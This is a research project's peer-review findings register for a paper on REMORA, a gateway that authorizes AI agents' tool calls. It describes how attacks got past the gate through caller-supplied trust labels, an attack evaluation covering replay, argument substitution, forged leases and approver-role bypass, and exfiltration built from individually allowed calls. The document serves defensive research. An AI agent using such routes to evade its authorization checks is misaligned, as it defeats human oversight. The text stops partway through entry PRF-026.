# Peer-review findings register

This register tracks objections raised against the REMORA paper
(`paper/remora_paper.md` and `paper/remora_paper.tex`) and what was done
about each one. A finding is RESOLVED only when the fix has been checked
against the objection itself. Changed text is not enough for a statistical
error, an over-generalisation or a missing baseline: those stay OPEN until the
analysis or data exists.

`tests/test_peer_review_findings.py` checks the register's structure.

## Statuses

| Status | Meaning |
|---|---|
| OPEN | The objection stands and no fix is in place. |
| IN_PROGRESS | Part of the fix is in place; the remainder is named under Verification. |
| RESOLVED | The fix is in place and was checked against the objection. |
| ACCEPTED_LIMITATION | The objection is correct and cannot be fixed for the existing evidence; the paper states it as a limit. |
| SUPERSEDED | A later finding or decision replaces this one. |

## Review rounds

- R1 (2026-10-17). An adversarial internal review of the paper at master
  `f66c4f7b` by four AI reviewer agents. Each had one remit: statistics and
  experimental design, security novelty and literature, tool-use benchmark
  validity, and overclaiming and md/tex consistency. Each cited file and line,
  and the maintainer re-checked the decisive findings against the repository
  before acting on them. R1 is not an independent human review; REM-021
  remains open (`docs/AI_USE.md`).
- R1 errors. Two R1 assertions were wrong or too broad, and are kept here
  for the record.
  - The overclaiming reviewer said the negation limit (NEGATIVE_RESULTS.md
    §81) affects both semantic arms of C-ext4. It does not affect the
    confirmatory arm: bundle v2's extractor returns no intent for "Please do
    not cancel booking B-104". It does apply to C-ext3 and to the frozen-bundle
    arm F1 in C-ext4.
  - The maintainer's first answer to the clustering question was also wrong.
    It said the 295 C-ext4 wrong calls were independent because they sit in
    295 source clusters. They share 67 proposed tools, and the decision
    depends on the tool (PRF-009).

- R2 (2026-10-17). An external read of the repository at `d66828d` that also
  ran the test suite. It reported three ways past the advisory library path
  (PRF-040 to PRF-042). The maintainer reproduced them, with one
  correction: an attack reaches ACCEPT only when the caller also supplies
  a low risk tier, a read action type and a high trust score. Without
  those labels the same calls route to VERIFY or ABSTAIN. R2's statement
  that the gate cut AgentHarm recall to 11 % counts only hard ESCALATE.
  Counting VERIFY, Mode 3 blocked 43 of 44 harmful tasks. The finding
  behind it is real: Mode 3 tells no twin pair apart where the oracle
  alone tells 29 apart (NEGATIVE_RESULTS.md §80).

- R3 (2026-10-18). An external, AI-assisted adversarial audit of the code,
  architecture and research record at master `b64e3cc1`. A review of the
  diffs of the fix PRs (#936, #942, #943, #944) followed the same day. The
  audit reported thirteen findings (RMR-AUD-001 to RMR-AUD-013, here
  PRF-044 to PRF-056), and the diff review found four holes in the fix PRs
  (PRF-057 to PRF-060). Each was reproduced or confirmed against the
  repository before it was fixed, and each fix carries a regression test.
  The fixes reached master through #932 to #944 and #940, consolidated in
  `5b2c7dc8`. R3 is not an independent human review; REM-021 remains open
  (`docs/AI_USE.md`).
- R3 errors and claims not adopted. Kept here for the record.
  - P0-1A (taint added at `/execute` launders a goal-mismatch ESCALATE)
    reproduced at `b64e3cc1` but no longer at master `b7c6517e`. The COMP-01
    meet composition (#907) already returned `approval_invalidated` there.
  - Three flow claims were reproduced but not changed, because the change
    would break the IFC SDD (`docs/design/derived-information-flow-control-v1.md`
    §3.2.1, §3.3). An email argument on a read-only tool with no recipients
    sends nothing to anyone (007c). Walking into a container that has no
    rule of its own would show its key structure to a model that may not
    read it (008a); lint rule FL-14 now refuses the unreachable BY_VALUE rule
    instead. Argument labels are always joined into a result label, so a
    PUBLIC field under a tainted call is not shown by value (008b).
  - An instruction given during the fixes, to refuse an `EFFECT_VERIFIED`
    receipt whose expected and observed digests differ, was wrong. The
    comparison is rule-based, so a valid verification normally hashes two
    different maps. It was not applied; the server now re-evaluates the
    postcondition itself (CAPR-07).
  - The audit placed entity resolution in `remora/policy/resolution.py`.
    That module is resolver re-entry for missing arguments and must not
    endorse data, so the SDD places it as an endorsement source beside the
    flow check (PRF-060).

## Level plan (owner decision, 2026-10-17)

1. Level 1: text corrections that need no new numbers.
2. Level 2: statistical re-analysis of existing data. These are added as
   post-hoc artifacts with their own scripts and never overwrite a sealed
   result.
3. Level 3: a bounded research programme: a threat model, an attack
   evaluation of the execution chain, and SAP v7 on a new tool catalogue with
   model-generated wrong calls and external baselines.

The paper is framed as a systems artifact plus research method, around one
primary hypothesis: can independently enforced authorization boundaries
preserve useful agent autonomy under realistic, adversarial tool-use
conditions?

## Findings

### PRF-001 The .tex oracle-count result contradicted the .md

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | The .tex said majority vote gains about 10 pp and correlation weighting adds a further gain. The .md and the artifact say +25.8 pp, and weighting (69.54%) is below majority vote (82.78%). |
| Evidence | `paper/remora_paper.tex`, the Ablations section at `f66c4f7b`; `results/ablation_v2_results.json` (A 0.5695, B 0.8278, C 0.6954). |
| Affected claims | none (exploratory ablation) |
| Action | Copy the .md result into the .tex. |
| Owning PR | level-1 PR |
| Verification | The .tex now gives 56.95%, 82.78% (+25.8 pp) and 69.54%, which matches `results/ablation_v2_results.json` and the .md Table 1. |
| Status | RESOLVED |

### PRF-002 Open negative results §80 and §81 were not cited

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | The paper reported AgentHarm Mode 3 and the C-ext3 intents without citing §80 (Mode 3 tells 0 of 44 twin pairs apart) or §81 (the intent extractor ignores negation). |
| Evidence | A grep for §80/§81 in both paper files at `f66c4f7b` returned nothing. |
| Affected claims | CLAIM-002, CLAIM-019 |
| Action | Cite §80 in the AgentHarm interpretation and §81 in the C-ext3 caveats. State that bundle v2 handles negation. |
| Owning PR | level-1 PR |
| Verification | §10.6 and §10.9 of both files cite them. The v2 negation statement was checked by running `bfcl_semantic_bundle_v2.extract_intent` on "Please do not cancel booking B-104", which returns no intent. R3 (2026-10-18) found that v2 still supports a mutation in conditional and informational sentences ("before cancel", "Tell me if I can cancel"); that limit is PRF-052, and the statement "bundle v2 handles negation" holds for negation only. |
| Status | RESOLVED |

### PRF-003 AgentHarm "all three governance goals met" rested on an asymmetric metric

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | VERIFY counts as a block for harmful tasks but not as friction for benign ones, and Mode 3 sends 80 of 88 cases to VERIFY. |
| Evidence | §10.6; NEGATIVE_RESULTS.md §80. |
| Affected claims | none directly (the tri-mode run is not a register claim); CLAIM-002 context |
| Action | Qualify the goals sentence, state the asymmetry and report the twin-pair result. |
| Owning PR | level-1 PR |
| Verification | Both files now say the goals are met only under the blocked-recall definition, give 80/88 to VERIFY, and report 0 of 44 pairs (Mode 3) against 29 of 44 (Mode 1). A benign-friction column in the table was not added. |
| Status | RESOLVED |

### PRF-004 Abstract and headline table dropped decisive caveats

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | The CLAIM-001 row omitted the 1.4% baselines and the non-significance. The CLAIM-002 row omitted FBR 100%. "The same rules" was false, because CLAIM-002 is an imported AROMER run. The simulator scope was not stated. |
| Evidence | `paper/remora_paper.md` abstract and Table at `f66c4f7b`; `docs/assurance/claim_register_v1.yaml` CLAIM-001/002. |
| Affected claims | CLAIM-001, CLAIM-002 |
| Action | Add the caveats and remove "same rules". |
| Owning PR | level-1 PR; FBR floor in the level-1 remainder PR (stacked on #927) |
| Verification | The abstract and table in both files now carry the baselines, the non-significance, every benign counterpart blocked, "imported intent-gating run" and "simulator". The AgentHarm row of the headline table in both files now states FBR 100% against the pre-registered floor of at most 40%, missed, with a note citing `artifacts/verify_protocols/agentharm_rescore_v1.json` (`fbr_target` "<=40%", `fbr_target_met` false) and NEGATIVE_RESULTS.md §19. The claim register records the same floor as `missed` under CLAIM-002 `utility_floors`. The note says the floor was fixed for the re-scoring of the 208 benign scenarios, as the artifact does. |
| Status | RESOLVED |

### PRF-005 The safety result was attributed to the deterministic floor without evidence

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | §17 opened with "Autonomous safety needs a deterministic floor", although the ablation records FAR 0 with the hard blocks removed. §11.1 deferred to a "mechanism-level argument in §17", and §17 did not contain one. |
| Evidence | §11.1, §17, CLAIM-020. |
| Affected claims | CLAIM-001, CLAIM-020 |
| Action | Retitle §17's first result and state that the floor's share is unmeasured. |
| Owning PR | level-1 PR |
| Verification | A grep for "mechanism-level argument" and "produced by deterministic" in both files returns nothing. §17 now reads "The zero-unsafe result has no identified cause." |
| Status | RESOLVED |

### PRF-006 "The routing behaviour transfers" over-generalised

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | The heading cites superseded CLAIM-018 and contradicts §82: the gain is on dev-seen tools of one catalogue. |
| Evidence | Abstract and §17 at `f66c4f7b`; NEGATIVE_RESULTS.md §82. |
| Affected claims | CLAIM-018, CLAIM-021 |
| Action | Say "within one tool catalogue" and remove CLAIM-018 from the abstract headline. |
| Owning PR | level-1 PR |
| Verification | A grep for "transfers" in both files returns no heading. The .md abstract no longer cites CLAIM-018. The .tex abstract keeps it only as the superseded baseline. |
| Status | RESOLVED |

### PRF-007 The C-ext3 pre-registered joint hypothesis failed but was framed as a safety success

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | SAP v5 makes wrong-call ACCEPT and read autonomy (≥75%) co-primary under intersection-union. Read autonomy was 26.6%, so the hypothesis was not supported, while the paper led with "eliminated" wrong-call acceptance. |
| Evidence | `docs/assurance/statistical_analysis_plan_v5_bfcl_semantic.md` §2; CLAIM-019. |
| Affected claims | CLAIM-019 |
| Action | State that the joint hypothesis was not supported wherever 0/500 is reported, and drop "eliminated". |
| Owning PR | level-1 PR |
| Verification | The abstract, introduction, §10.9 and §17 in both files say so, and "eliminat" no longer appears in reader text about C-ext3. |
| Status | RESOLVED |

### PRF-008 C-ext4 targets were set after the bundle existed, and refuse-all meets five of eight

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | Bundle v2 (08cc45e8, 12:04) came before SAP v6 (f0e6b18d, 12:21) on the same day. The obtainable-VERIFY bar fell from 95% to 60%, and the 75% read-autonomy bar was dropped. CONTROL meets all three safety targets plus irrelevance and unobtainable ABSTAIN. |
| Evidence | git log; `results/routing_bench_bfcl_v4_cext4_results.json` `per_arm_metrics.CONTROL`. |
| Affected claims | CLAIM-021 |
| Action | Disclose this in §10.9 and §14. The run cannot be repeated; SAP v7 must fix targets before any bundle is written. |
| Owning PR | level-1 PR |
| Verification | Both files call the targets floors set after the bundle, name the five targets CONTROL meets, and report V2 (84/291) beside V2D (87/291). |
| Status | ACCEPTED_LIMITATION |

### PRF-009 Zero-count bounds assume independence between rows that share a tool

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | The 295 C-ext4 wrong calls use 67 proposed tools, and the 500 C-ext3 wrong calls use 106. The decision is a function of the tool, so tool-clustered upper bounds are wider: the reviewer estimates about 5.4% and 3.5%, against 1.29% and 0.76%. Only 137 of the 295 were actively rejected; the rest were held at VERIFY or ESCALATE. |
| Evidence | `data/routing_bench_bfcl_v4_cext4/bfcl_holdout.jsonl` (67 distinct `proposed_tool_name` among `:substituted` episodes, maintainer re-count); the reviewer's in-memory re-route. |
| Affected claims | CLAIM-019, CLAIM-021 |
| Action | Level 2: a post-hoc script and artifact giving tool-clustered and crossed bounds, the actively rejected count, and CONTROL beside each safety number. The paper now calls the 0.76% bound "row-level" and §14 says clustered bounds are wider and not yet reported. |
| Owning PR | level-2 PR |
| Verification | `artifacts/posthoc/peer_review_level2_v1.json` (`scripts/peer_review_posthoc.py`, tested by `tests/test_peer_review_posthoc.py`): the upper bounds clustered by tool are 3.5% (C-ext3, 106 tools) and 5.42% (C-ext4, 67 tools). V2D actively rejected 137 of 295; the other 158 were held. Both are reported in §10.9, §14 and the headline table of both paper files, and in NEGATIVE_RESULTS.md §83. A crossed task-by-tool bound was not computed; the tool unit is the conservative one, because no tool has an accept. |
| Status | RESOLVED |

### PRF-010 BFCL "native" wrong calls are synthetic cross-task substitutions

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | Each wrong call is another task's gold call added to the task's tool list. The committed count is 291 of 295 in C-ext4 and 498 of 500 in C-ext3 naming a tool the original task never offered. The reviewer's 287 and the maintainer's first rough count of 8 in-catalogue calls were both superseded by the artifact. Such calls are easier to separate than real model errors. |
| Evidence | `remora/toolcall/routing/sources/bfcl.py` (the `substituted` episode); maintainer re-count on the C-ext4 holdout. |
| Affected claims | CLAIM-018, CLAIM-019, CLAIM-021 |
| Action | Disclose the construction in §10.8 and §14 (done). Level 2: report the in-catalogue subset. Level 3: model-generated wrong calls in SAP v7. |
| Owning PR | level-1 PR (disclosure); level-2 PR (subset); SAP v7 (new data) |
| Verification | `artifacts/posthoc/peer_review_level2_v1.json` (`scripts/peer_review_posthoc.py`, tested by `tests/test_peer_review_posthoc.py`): the in-catalogue subset is 4/295 (C-ext4) and 2/500 (C-ext3), with 0 accepts in every arm. The paper states that the zero counts say almost nothing about confusing two tools of one task. Model-generated wrong calls need new data (SAP v7). |
| Status | ACCEPTED_LIMITATION |

### PRF-011 No external or naive baseline on the sealed BFCL episodes

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | A name-overlap rule may be competitive, and no LLM judge or existing guardrail was run. The reviewer's substring rule gave 80/291 gold and 2/295 wrong; it is superseded by the committed word-match rule below. |
| Evidence | reviewer computation; maintainer re-run (scratch, not committed). |
| Affected claims | CLAIM-021, CLAIM-019 |
| Action | Level 2: committed post-hoc naive arms (name overlap, schema-only) with accept-gold against accept-wrong curves, labelled post hoc. Level 3: external baselines (LLM judge, policy engine) in SAP v7. §14 now states that no such baseline was run. |
| Owning PR | level-2 PR (naive rules); SAP v7 (external baselines) |
| Verification | `artifacts/posthoc/peer_review_level2_v1.json` (`scripts/peer_review_posthoc.py`, tested by `tests/test_peer_review_posthoc.py`): two-token overlap gives 51/291 gold, 2/295 wrong, 1/119 wrong tool and 48/238 missing-argument accepts. One-token overlap gives 178/291, 6/295, 29/119 and 132/238. Schema-only accepts all 295 wrong calls. V2D gives 87/291 and 0 on every other family. The results are reported in §10.9 and §14 and in §83. External baselines (LLM judge, existing guardrail) still need SAP v7. Pre-registered, not run: SAP v7 §14 (Q7, draft addendum of 2026-10-18) fixes an LLM judge (`claude-sonnet-5-5`, frozen prompt, matched-safety threshold), Invariant Guardrails as the policy engine, hypotheses H5 to H7 and their thresholds, on BFCL v4 multi-turn at gorilla `6ea57973` with model-generated wrong calls. No data yet; owner approval and sealing are pending (§15.5). |
| Status | IN_PROGRESS |

### PRF-012 The system routes annotated gold proposals; this was not stated

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | REMORA never generates a call. Gold-call acceptance is a friction measure on correct proposals, not task success. |
| Evidence | `remora/toolcall/routing/sources/bfcl.py`, where the gold name and `allowed[0]` arguments become the proposal. |
| Affected claims | CLAIM-021 |
| Action | State the input contract in the abstract, §10.8 and §14. |
| Owning PR | level-1 PR |
| Verification | Both files now say "REMORA routes annotated calls; it does not generate them", and §14 says the measure is not comparable with leaderboard scores. |
| Status | RESOLVED |

### PRF-013 Argument families can be told apart by tool name; irrelevance holds by construction

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | The obtainable mutant adds a producer named after the dropped argument. Irrelevance episodes propose no call. In 100 of 119 constructed wrong-tool mutants, a schema check alone rejects the call. |
| Evidence | `remora/toolcall/routing/mutations.py` (the `MISSING_ARG_OBTAINABLE` producer); `bfcl.py` (irrelevance `proposed_name=None`). |
| Affected claims | CLAIM-018, CLAIM-019, CLAIM-021 |
| Action | Disclose (done). Level 2: report wrong-tool results on the schema-valid subset. SAP v7: realistic producer names, and irrelevance episodes that propose a plausible call. |
| Owning PR | level-1 PR (disclosure); level-2 PR (subset) |
| Verification | `artifacts/posthoc/peer_review_level2_v1.json` (`scripts/peer_review_posthoc.py`, tested by `tests/test_peer_review_posthoc.py`): 19 of 119 C-ext4 wrong-tool mutants pass a schema check, and none was accepted by any arm. In C-ext3, 26 of 199 pass, and arm F's 2 wrong-tool accepts are among them. The construct cannot change for spent data; SAP v7 must use realistic producer names and proposed irrelevance calls. |
| Status | ACCEPTED_LIMITATION |

### PRF-014 The C-ext4 gain sits on tools seen in development

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | 76 of 87 accepts fall on dev-seen tools; on the 36 unseen-tool calls the score is 11 against 8. |
| Evidence | NEGATIVE_RESULTS.md §82; `artifacts/posthoc/bfcl_cext4_seen_split.json`. |
| Affected claims | CLAIM-021 |
| Action | Already disclosed (#898). Only a new sealed catalogue (SAP v7) can test generalisation. |
| Owning PR | #898 |
| Verification | The abstract, §10.9 and §17 state the limit, and the split is reproduced by a test. |
| Status | ACCEPTED_LIMITATION |

### PRF-015 No threat model, and the execution chain is not evaluated against attacks

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | Contribution 1 (ToolSpec, lease, grant, re-check) is never measured. There is no attack harness covering replay, argument substitution, ToolSpec swap, cross-task reuse, forged lease or TOCTOU. There is no explicit threat-model section. |
| Evidence | §4.4, §10, §2.11 ("covers injection and oracle compromise"). |
| Affected claims | none (no claim measures the chain) |
| Action | Level 3: a threat-model section and an attack evaluation against a policy-only gateway baseline. New §13.13 and contribution 1 now state that the chain is not evaluated. |
| Owning PR | level-1 PR (disclosure); evaluation in the evidence/execution-chain-attack-eval PR; threat model in #927; approver-role measurement and threat-model update in fix/peer-review-remaining |
| Verification | The attack evaluation exists: `scripts/execution_chain_attack_eval.py`, `artifacts/posthoc/execution_chain_attack_eval_v1.json`, `tests/test_execution_chain_attack_eval.py`, NEGATIVE_RESULTS.md §87. It drives `/v1/execution` (signed ToolSpec bundle, ACCEPT token, review grant, lease, dispatch re-check) and a policy-only gateway that takes the same proposal-time decision. Over replay, argument substitution, ToolSpec redeploy or callable swap, risk relabel, cross-task/actor/tenant reuse, forgery, expiry and approver role, REMORA ran 0 of 43 attacks and the gateway 33. REMORA ran all 20 benign controls. The four attacks that ran on REMORA in the first measurement are closed: the review path now binds the executing actor and task through the `AuthorizationContext` comparison (both refuse `context_mismatch`), and a reviewed risk tier that changed voids the approval (`approval_invalidated`). The artifact was regenerated on master after the R3 fixes (`ac97406f`). 2026-10-19: the `approver_role` class runs the real `_enforce_review_approval_role`, which the harness bypassed before. A wrong role is refused at `/approve` on both arms (reviewer on high, domain_expert on critical, operator, a role outside `reviewer_roles`). An approval is voided when the tier is raised or the profile reserves the tier for another role, and the gateway runs both. Pinned by `test_the_approver_role_path_is_measured_with_the_real_check`. The threat model is paper §3.1 (#927). It now states the argument-content and destination gap and that the injection pattern list is a hint, and points to §13.13, which reports the evaluation. Stated limits, not open work: the catalogue is the author's own and post hoc, in one profile with in-process state and HMAC signing; an external or adaptive attacker is not measured, and exfiltration is PRF-041. |
| Status | RESOLVED |

### PRF-016 Per-call authorization does not stop attacks composed of allowed calls

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | A read-secret-then-send exfiltration is built from individually authorized calls, and information-flow control exists for exactly this case. |
| Evidence | `docs/09-related-work.md` already conceded "REMORA does not claim trajectory-level enforcement"; the paper did not say so. |
| Affected claims | none |
| Action | Declare the non-claim in §2.11 and §13.13. |
| Owning PR | level-1 PR |
| Verification | Both files state that REMORA does not claim trajectory-level or data-flow enforcement. |
| Status | ACCEPTED_LIMITATION |

### PRF-017 Missing related work

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | The paper does not cite: information-flow control for agents (FIDES; Wu et al. 2024) and isolation (IsolateGPT/SecGPT); Conseca, MELON, Task Shield, Spotlighting and StruQ/SecAlign; agent design patterns (Beurer-Kellner et al.) and MCP; the reference monitor (Anderson 1972) and the confused deputy; macaroons and Biscuit, OAuth RAR (RFC 9396), XACML and Cedar; tamper-evident logging (Schneier–Kelsey, Crosby–Wallach, Certificate Transparency). |
| Evidence | Zero grep hits in the bibliography at `f66c4f7b`. |
| Affected claims | none |
| Action | Add a classical-foundations paragraph and an IFC/isolation subsection, with every reference verified against its source and given a role in the research control matrix (bibliography parity is CI-gated). |
| Owning PR | #929 (stacked on #927) |
| Verification | #927 added Anderson 1972, Hardy 1988, Birgisson et al. 2014 and Crosby & Wallach 2009. This PR adds four §2.11 paragraphs in .md and .tex (information-flow control and isolation; prompt-injection defenses; protocols, authorization tokens and policy languages; tamper-evident logs) and 18 references, each checked on 2026-10-18 against its primary source: the arXiv export API for title, authors and current version (FIDES 2505.23643v2; Wu, Cecchetti & Xiao 2409.19091v2, the IFC paper meant by "Wu et al. 2024"; IsolateGPT 2403.04960v2, whose v1 is titled SecGPT; Conseca 2501.17070v3; MELON 2502.05174v4; Task Shield 2412.16682v1; Spotlighting 2403.14720v1; StruQ 2402.06363v2; SecAlign 2410.05451v3; Beurer-Kellner et al. 2506.08837v3; Cedar 2403.04651v2), Crossref for Cedar (PACMPL 8 OOPSLA1), Task Shield (ACL 2025) and Schneier & Kelsey (ACM TISSEC 2(2), 159–176; Schneier's own page says v.1 n.3, Crossref was followed), rfc-editor.org for RFC 9396, 6962 and 9162, docs.oasis-open.org for XACML 3.0, modelcontextprotocol.io for MCP revision 2025-11-25, and biscuitsec.org for Biscuit. Each has a role in `docs/research/research_control_matrix_v1.yaml`; `generate_research_control_matrix.py --check` and `check_paper_sync.py` pass. Each paragraph states what REMORA does not do, including that it propagates no labels across calls and claims no trajectory-level property. No reference was dropped as unverifiable. Each of the 18 also has a `VERIFIED_RETRIEVED` entry, adoption `UNEVALUATED`, in `docs/research/research_shelf_v1.yaml` (SHELF-042 to SHELF-059), with the authors' reported results labelled as theirs; `check_research_shelf.py` passes. |
| Status | RESOLVED |

### PRF-018 Positioning was inconsistent with the evidence

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | §2.11 called the contribution "uncertainty-routed escalation" and treated capability enforcement as complementary. §4.4 is capability enforcement, and consensus signals are not on any governed path. |
| Evidence | §2.11, §5.2, §17. |
| Affected claims | none |
| Action | Reframe as a systems artifact plus evaluation method (owner decision 2026-10-17). Move the ensemble, debate, conformal and calibration material to an appendix. |
| Owning PR | level-1 PR (reframing sentences); appendix move in the level-1 remainder PR (stacked on #927) |
| Verification | Done: the abstract, contributions and §2.11 state the reframing in both files. The ensemble, conformal and calibration material of the body is now in appendices. In the .md, Appendix G holds the oracle swarm, canonicalizer and weighting (§4.1 to §4.3), the observable definitions (§5.1), the PhaseAwareGuardrail, weighted conformal selector and PVD-inspired score (§7.1 to §7.3), the three-oracle ablation (§10.2), Mondrian coverage (§10.5) and the oracle-count and weighting ablations (§11.2, §11.3). Each body heading keeps its number with a short pointer, so section references from §2 and from other documents stay valid. In the .tex the same material moved to three new appendices (`app:consensus`, `app:selection`, `app:mondrian`) beside the existing `app:crc`; a label/ref scan finds no duplicate label and no undefined reference. Every removed line is present in the appendix except the edited cross-references and the old CRC stub, whose caveat the new combined stub keeps. The §2 related-work subsections on ensembles, debate, conformal prediction and calibration were not moved: §2 belongs to a concurrent PR. |
| Status | RESOLVED |

### PRF-019 Clustering units for CLAIM-001 and CLAIM-002, and post-hoc utility test

| Field | Value |
|---|---|
| Severity | MAJOR |
| Claim | CLAIM-001's [0, 5.2%] uses 70 clusters, 14 of them benign-only. With 56 harmful clusters the bound is about 6.4%. CLAIM-002's 208 harmful scenarios come from 47 base behaviours, giving about 7.6%. The +0.46 utility test was declared post hoc. |
| Evidence | `results/toolcall_benchmark_v2_significance.json`; `docs/assurance/statistical_analysis_plan.md` (H2 not supported; the utility delta reported as post hoc); claim register comment for CLAIM-001. |
| Affected claims | CLAIM-001, CLAIM-002 |
| Action | Level 2: recompute both bounds at the harmful-template and behaviour level as post-hoc artifacts. Done: the abstract no longer cites +0.46, and §14 marks it post hoc. |
| Owning PR | level-2 PR; register comment in #927 |
| Verification | `artifacts/posthoc/peer_review_level2_v1.json` (`scripts/peer_review_posthoc.py`, tested by `tests/test_peer_review_posthoc.py`): CLAIM-001 has 56 harmful and 14 benign-only templates, giving an upper bound of 6.42%. CLAIM-002 has 47 base behaviours, giving 7.56%. Both are in the headline table and §14 of both paper files. The CLAIM-001 register comment was corrected in #927 (branch `fix/claims-and-paper-2026-10-18`): it now says the 560 harmful tasks collapse to 56 harmful template clusters, that 14 of the 70 templates are benign-only, and that `far_denominator` was corrected from 70 on 2026-10-18; the CLAIM-001 statement cites the 6.42% bound as post hoc. This finding is resolved once #927 is merged. |
| Status | RESOLVED |

### PRF-020 The C-ext4 McNemar p-value ignores tool clustering

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | The 69 V2D-only accepts fall on 19 tools. A tool-level sign test gives p ≈ 1.1×10⁻⁴, not ≈1e-18. The target is still met at 0.01. |
| Evidence | Reviewer re-route; SAP v6 P3. |
| Affected claims | CLAIM-021 |
| Action | Level 2: a tool-clustered paired test as a post-hoc artifact. |
| Owning PR | level-2 PR |
| Verification | `artifacts/posthoc/peer_review_level2_v1.json` (`scripts/peer_review_posthoc.py`, tested by `tests/test_peer_review_posthoc.py`): 19 tools favour V2D and 2 favour F1, one-sided p = 1.1×10⁻⁴. This is reported in §10.9 of both files beside the episode-level p. |
| Status | RESOLVED |

### PRF-021 C-ext3 ran three of six pre-registered arms and no paired test

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | SAP v5 §5 pre-registered arms A–F with cluster-level McNemar tests. `scripts/run_bfcl_cext3.py` runs A, C and F only. |
| Evidence | `scripts/run_bfcl_cext3.py` `_arm_engines`. |
| Affected claims | CLAIM-019 |
| Action | Done: the deviation is disclosed in §10.9 of both files. Level 2: post-hoc pairwise tests on the committed C-ext3 episodes. |
| Owning PR | level-1 PR (disclosure); level-2 PR (tests) |
| Verification | `artifacts/posthoc/peer_review_level2_v1.json` (`scripts/peer_review_posthoc.py`, tested by `tests/test_peer_review_posthoc.py`): exact McNemar gives structural against full 24/0 (p = 1.2×10⁻⁷), contracts-plus-intent against full 6/0 (p = 0.031) and read loss 22/0 (p = 4.8×10⁻⁷). These are reported in §10.9 and §83. Arms B, D and E were never run and cannot be recovered blind. |
| Status | RESOLVED |

### PRF-022 Not all C-ext4 arms reported; receipts credited for the gain

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | V2 without receipts accepted 84/291 against V2D's 87/291, so the receipts add 3. |
| Evidence | `results/routing_bench_bfcl_v4_cext4_results.json` `per_arm_metrics.V2`. |
| Affected claims | CLAIM-021 |
| Action | Report V2 and CONTROL in §10.9. |
| Owning PR | level-1 PR |
| Verification | Both files give V2 84/291 and the CONTROL targets. The counts were re-read from the result file. |
| Status | RESOLVED |

### PRF-023 The C-ext3 read-autonomy denominator was chosen by the bundle under test

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | 26.6% is 25/94 reads under the frozen bundle's own classification. Arm F accepted 25 of 487 gold calls. |
| Evidence | SAP v5 §12 deviation 1. |
| Affected claims | CLAIM-019 |
| Action | Done: the denominator is now disclosed in §10.9. Level 2: report the all-gold rate from a committed artifact. |
| Owning PR | level-1 PR (disclosure); level-2 PR (figure) |
| Verification | `artifacts/posthoc/peer_review_level2_v1.json` (`scripts/peer_review_posthoc.py`, tested by `tests/test_peer_review_posthoc.py`): arm F accepted 25 of 487 gold calls (5.1%), against 25 of 94 frozen-bundle reads. Both are in §10.9 of both files. |
| Status | RESOLVED |

### PRF-024 The CLAIM-005 split is exploratory, with a cutpoint chosen on the same items

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | The 16/21 vs 4/11 split uses τ chosen on the same 32 items (Fisher two-sided p ≈ 0.053, reviewer). The "replication" used simulated trust distributions. |
| Evidence | CLAIM-005; §13.3. |
| Affected claims | CLAIM-005 |
| Action | Done: removed from the .md abstract, and labelled exploratory in the .tex. Remaining: label §13.3 of the .md, and commit the p-value as a post-hoc artifact. |
| Owning PR | level-1 PR (abstract, .tex); level-2 PR (p-value, .md §13.3) |
| Verification | `artifacts/posthoc/peer_review_level2_v1.json` (`scripts/peer_review_posthoc.py`, tested by `tests/test_peer_review_posthoc.py`): Fisher's exact test gives p = 0.053. §13.3 (.md) and the .tex paragraph now call the split exploratory and give p. The split artifact says τ = 0.10 is a documented operating point, not tuned to the labels; the reviewer's claim that it was chosen on the same items is recorded but not established. |
| Status | RESOLVED |

### PRF-025 CLAIM-014's "0% to 100%" had no n and a zero-by-construction baseline

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | The figure is 60/60 valid-identifier reads, and the baseline is zero because there are no validators and the index is empty. |
| Evidence | `results/fleetops_validator_study_results.json` (`valid_id_completion_read` 60/60 with validators, 0/60 without). |
| Affected claims | CLAIM-014 |
| Action | Give n/d and say the baseline is zero by construction. |
| Owning PR | level-1 PR |
| Verification | The abstract, table, §12b and §17 in both files give 60/60 and 0/60, and the counts were re-read from the artifact. |
| Status | RESOLVED |

### PRF-026 Sealing has no external timestamp

| Field | Value |
|---|---|
| Severity | MINOR |
| Claim | The seal shows only that hashes were recorded in order on a self-hosted git history. |
| Evidence | SAP v6. |
| Affected claims | CLAIM-019, CLAIM-021 |
| Action | Stamp every seal with OpenTimestamps before any data is built (owner decision 2026-10-18; only digests go to the public calendars). SAP v7 is also registered on OSF before the run. |
| Owning PR | #930 |
